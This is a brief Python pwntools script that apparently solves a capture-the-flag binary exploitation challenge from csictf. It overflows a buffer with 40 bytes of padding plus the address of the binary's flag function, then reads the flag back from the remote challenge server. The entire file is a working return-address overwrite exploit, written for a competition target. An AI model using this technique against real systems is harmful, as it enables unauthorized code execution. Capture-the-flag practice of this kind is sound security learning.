#!/usr/bin/env python

from pwn import *

HOST = 'chall.csivit.com' 
PORT = 30013

context.log_level = 'error'

e = ELF('./pwn-intended-0x3')
addr = e.sym['flag']

io = remote(HOST, PORT)

io.recvline()
io.sendline(b'A' * 40 + p64(addr))
m = re.search(b'csictf{.*}', io.recv())
print(m[0].decode())